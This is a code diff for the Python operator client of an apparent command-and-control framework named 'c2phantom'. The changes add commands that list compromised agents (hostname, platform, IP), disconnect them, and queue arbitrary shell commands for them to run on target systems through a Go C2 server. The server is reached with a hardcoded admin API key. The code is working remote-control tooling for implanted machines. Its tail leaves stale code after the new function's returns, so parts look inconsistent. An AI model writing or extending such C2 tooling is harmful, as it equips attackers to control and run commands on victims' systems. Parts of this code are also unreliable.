@@ -155,58 +155,55 @@ def init(config: Optional[str], force: bool) -> None:
 @click.option("--status", type=click.Choice(["active", "inactive", "all"]), default="all")
 @click.option("--format", "output_format", type=click.Choice(["table", "json", "yaml"]), default="table")
 @click.option("--verbose", is_flag=True, help="Show detailed information")
-def list(status: str, output_format: str, verbose: bool) -> None:
-    """List active sessions and connections."""
+@click.option("--server", default="http://localhost:8080", help="C2 server URL")
+def list(status: str, output_format: str, verbose: bool, server: str) -> None:
+    """List active sessions and connections from the Go backend server."""
     try:
-        session_manager = SessionManager()
-
-        # Get sessions
-        if status == "all":
-            sessions = session_manager.list_sessions()
-        else:
-            status_enum = SessionStatus.ACTIVE if status == "active" else SessionStatus.INACTIVE
-            sessions = session_manager.list_sessions(status=status_enum)
-
-        if not sessions:
-            print_info("No sessions found.")
+        # Fetch real agent data from Go server
+        result = asyncio.run(_fetch_agents_from_server(server, status))
+        
+        if not result or not result.get("agents"):
+            print_info("No agents found. Start the Go server with: .\\START-SERVER.ps1")
             return
+        
+        agents = result["agents"]
 
         if output_format == "table":
-            # Create beautiful table
+            # Create beautiful table with REAL backend data
             table = Table(
-                title=f"📊 Sessions ({len(sessions)} total)",
+                title=f"📊 Active Agents ({len(agents)} total) - Live from Go Server",
                 box=box.ROUNDED,
                 show_header=True,
                 header_style="bold cyan",
             )
 
-            table.add_column("Session ID", style="cyan", no_wrap=True)
-            table.add_column("Target", style="yellow")
-            table.add_column("Protocol", style="green")
+            table.add_column("Agent ID", style="cyan", no_wrap=True)
+            table.add_column("Hostname", style="yellow")
+            table.add_column("Platform", style="green")
             table.add_column("Status", style="magenta")
-            table.add_column("Encryption", style="blue")
+            table.add_column("Last Seen", style="blue")
 
             if verbose:
-                table.add_column("Created", style="dim")
-                table.add_column("Last Seen", style="dim")
+                table.add_column("IP Address", style="dim")
+                table.add_column("Tasks", style="dim")
 
-            for session in sessions:
-                status_emoji = "🟢" if session.status == SessionStatus.ACTIVE else "🔴"
+            for agent in agents:
+                status_emoji = "🟢" if agent.get("active") else "🔴"
+                agent_status = "active" if agent.get("active") else "inactive"
+                
                 row = [
-                    session.id[:8] + "...",
-                    session.target,
-                    session.protocol.upper(),
-                    f"{status_emoji} {session.status.value}",
-                    session.encryption.upper(),
+                    agent.get("id", "unknown")[:12] + "...",
+                    agent.get("hostname", "unknown"),
+                    agent.get("platform", "unknown"),
+                    f"{status_emoji} {agent_status}",
+                    agent.get("last_seen", "never"),
                 ]
 
                 if verbose:
-                    row.extend(
-                        [
-                            session.created_at.strftime("%Y-%m-%d %H:%M"),
-                            session.last_seen.strftime("%Y-%m-%d %H:%M"),
-                        ]
-                    )
+                    row.extend([
+                        agent.get("ip_address", "unknown"),
+                        str(agent.get("task_count", 0)),
+                    ])
 
                 table.add_row(*row)
 
@@ -214,19 +211,88 @@ def list(status: str, output_format: str, verbose: bool) -> None:
 
         elif output_format == "json":
             import json
-
-            data = [s.to_dict() for s in sessions]
-            console.print_json(json.dumps(data, indent=2))
+            console.print_json(json.dumps(agents, indent=2))
 
         elif output_format == "yaml":
             import yaml
-
-            data = [s.to_dict() for s in sessions]
-            console.print(yaml.dump(data, default_flow_style=False))
+            console.print(yaml.dump(agents, default_flow_style=False))
 
     except Exception as e:
-        print_error(f"Failed to list sessions: {str(e)}")
+        print_error(f"Failed to list agents: {str(e)}")
+        print_info("Make sure the Go server is running: .\\START-SERVER.ps1")
         sys.exit(1)
+
+
+async def _fetch_agents_from_server(server_url: str, status_filter: str) -> Optional[dict]:
+    """Fetch real agent list from Go backend server."""
+    import aiohttp
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            # Query agents endpoint with API key
+            headers = {"X-API-Key": "c2phantom-admin-key-change-me"}
+            params = {}
+            
+            if status_filter == "active":
+                params["active"] = "true"
+            elif status_filter == "inactive":
+                params["active"] = "false"
+            
+            url = f"{server_url}/api/v1/agents"
+            
+            async with session.get(url, headers=headers, params=params, timeout=5) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    return {"agents": data.get("agents", [])}
+                else:
+                    return None
+    except Exception as e:
+        return None
+
+
+@main.command()
+@click.argument("agent_id")
+@click.option("--server", default="http://localhost:8080", help="C2 server URL")
+@click.option("--force", is_flag=True, help="Force disconnect without confirmation")
+def disconnect(agent_id: str, server: str, force: bool) -> None:
+    """Disconnect and remove an agent from the C2 server."""
+    try:
+        if not force:
+            response = click.confirm(
+                f"Are you sure you want to disconnect agent {agent_id[:12]}...?",
+                default=False
+            )
+            if not response:
+                print_info("Disconnect cancelled")
+                return
+        
+        # Disconnect via Go server API
+        result = asyncio.run(_disconnect_agent_from_server(agent_id, server))
+        
+        if result:
+            print_success(f"✓ Agent [cyan]{agent_id[:12]}...[/cyan] disconnected successfully")
+        else:
+            print_error(f"Failed to disconnect agent {agent_id[:12]}...")
+            sys.exit(1)
+            
+    except Exception as e:
+        print_error(f"Disconnect failed: {str(e)}")
+        sys.exit(1)
+
+
+async def _disconnect_agent_from_server(agent_id: str, server_url: str) -> bool:
+    """Disconnect agent via Go backend API."""
+    import aiohttp
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            headers = {"X-API-Key": "c2phantom-admin-key-change-me"}
+            url = f"{server_url}/api/v1/agents/{agent_id}"
+            
+            async with session.delete(url, headers=headers, timeout=5) as response:
+                return response.status == 200
+    except Exception:
+        return False
 
 
 @main.command()
@@ -324,19 +390,18 @@ async def _upload_file_real(
 
 @main.command()
 @click.argument("command")
-@click.option("--session", required=True, help="Session ID")
+@click.option("--agent", required=True, help="Agent ID")
 @click.option("--output", is_flag=True, help="Show command output")
 @click.option("--timeout", type=int, default=30, help="Execution timeout in seconds")
-@click.option("--async", "is_async", is_flag=True, help="Execute asynchronously")
-@click.option("--server", default="http://localhost:8443", help="C2 server URL")
-def execute(command: str, session: str, output: bool, timeout: int, is_async: bool, server: str) -> None:
-    """Execute commands on target systems."""
+@click.option("--server", default="http://localhost:8080", help="C2 server URL")
+def execute(command: str, agent: str, output: bool, timeout: int, server: str) -> None:
+    """Execute commands on target systems via Go backend."""
     try:
-        # Run async operation
-        result = asyncio.run(_execute_command_real(command, session, timeout, server, output))
+        # Run async operation - real backend integration
+        result = asyncio.run(_execute_command_real(command, agent, timeout, server, output))
 
         if not result:
-            print_error("Command timed out or failed")
+            print_error("Command timed out or failed. Check if Go server is running.")
             sys.exit(1)
 
     except Exception as e:
@@ -345,11 +410,75 @@ def execute(command: str, session: str, output: bool, timeout: int, is_async: bo
 
 
 async def _execute_command_real(
-    command: str, session_id: str, timeout: int, server_url: str, show_output: bool
+    command: str, agent_id: str, timeout: int, server_url: str, show_output: bool
 ) -> Optional[dict]:
-    """Execute command via C2 server."""
-    exec_mode = "synchronous"
-    print_info(f"Executing command ({exec_mode}) on session [cyan]{session_id[:8]}...[/cyan]")
+    """Execute command via Go C2 server backend."""
+    import aiohttp
+    
+    print_info(f"Creating task for agent [cyan]{agent_id[:12]}...[/cyan]")
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            headers = {
+                "X-API-Key": "c2phantom-admin-key-change-me",
+                "Content-Type": "application/json"
+            }
+            
+            # Create task in Go backend
+            task_data = {
+                "agent_id": agent_id,
+                "command": "shell",
+                "arguments": [command]
+            }
+            
+            url = f"{server_url}/api/v1/tasks"
+            
+            async with session.post(url, json=task_data, headers=headers, timeout=5) as response:
+                if response.status == 200:
+                    task = await response.json()
+                    task_id = task.get("id")
+                    
+                    print_success(f"✓ Task created: ID {task_id}")
+                    print_info("Waiting for agent to execute task...")
+                    
+                    # Poll for task completion
+                    for _ in range(timeout):
+                        await asyncio.sleep(1)
+                        
+                        async with session.get(
+                            f"{server_url}/api/v1/tasks/{task_id}",
+                            headers=headers,
+                            timeout=5
+                        ) as status_response:
+                            if status_response.status == 200:
+                                task_status = await status_response.json()
+                                
+                                if task_status.get("status") == "completed":
+                                    result_data = task_status.get("result", "")
+                                    print_success("✓ Task completed")
+                                    
+                                    if show_output and result_data:
+                                        console.print(Panel(
+                                            result_data,
+                                            title="Command Output",
+                                            border_style="green"
+                                        ))
+                                    
+                                    return task_status
+                                elif task_status.get("status") == "failed":
+                                    error = task_status.get("error", "Unknown error")
+                                    print_error(f"Task failed: {error}")
+                                    return None
+                    
+                    print_warning("Task timeout - still pending on agent")
+                    return None
+                else:
+                    print_error(f"Failed to create task: HTTP {response.status}")
+                    return None
+                    
+    except Exception as e:
+        print_error(f"Backend communication error: {str(e)}")
+        return None
 
     # Create client
     client = C2Client(server_url=server_url)
